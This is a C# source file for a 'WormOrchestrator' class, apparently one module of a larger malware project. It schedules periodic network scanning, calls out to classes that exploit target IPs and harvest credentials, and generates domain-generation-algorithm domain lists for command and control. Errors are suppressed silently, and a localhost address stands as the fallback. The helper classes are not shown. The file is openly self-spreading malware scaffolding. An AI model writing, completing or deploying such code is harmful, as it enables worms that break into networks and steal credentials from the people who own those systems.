using System;
using System.Collections.Generic;
using System.Threading.Tasks;

namespace XYZ.modules.worm
{
    public class WormOrchestrator
    {
        private NetworkScanner networkScanner;
        private TargetExploiter targetExploiter;
        private CredentialExfiltrator credentialExfiltrator;
        private DGAServices dgaServices;
        
        public WormOrchestrator()
        {
            networkScanner = new NetworkScanner();
            targetExploiter = new TargetExploiter();
            credentialExfiltrator = new CredentialExfiltrator();
            dgaServices = new DGAServices();
        }
        
        public void StartWormActivities()
        {
            System.Timers.Timer wormTimer = new System.Timers.Timer(300000); // 5 minutes
            wormTimer.Elapsed += WormTimer_Elapsed;
            wormTimer.AutoReset = true;
            
            Task.Run(() => DelayedWormTick());
            wormTimer.Start();
        }

        private void WormTimer_Elapsed(object sender, System.Timers.ElapsedEventArgs e)
        {
            Task.Run(() => WormTick());
        }

        private void DelayedWormTick()
        {
            Task.Delay(30000).Wait(); // 30 seconds delay
            Task.Run(() => WormTick()).Wait();
        }

        private void WormTick()
        {
            try
            {
                // Start network scanning
                networkScanner.StartScanning();
            }
            catch
            {
                // Silent fail
            }
        }
        
        public void ExploitTarget(string targetIP)
        {
            try
            {
                targetExploiter.TryExploitTarget(targetIP);
            }
            catch
            {
                // Silent fail
            }
        }
        
        public void HarvestCredentials(string targetIP)
        {
            try
            {
                credentialExfiltrator.TryCredentialHarvesting(targetIP);
            }
            catch
            {
                // Silent fail
            }
        }
        
        public string GetDgaDomain(int dayOffset = 0)
        {
            try
            {
                return dgaServices.GenerateDgaDomain(dayOffset);
            }
            catch
            {
                return "127.0.0.1:8000"; // Fallback
            }
        }
        
        public string[] GetDgaDomainList(int daysBack = 7, int daysForward = 7)
        {
            try
            {
                return dgaServices.GenerateDgaDomainList(daysBack, daysForward);
            }
            catch
            {
                return new string[] { "127.0.0.1:8000" }; // Fallback
            }
        }
    }
}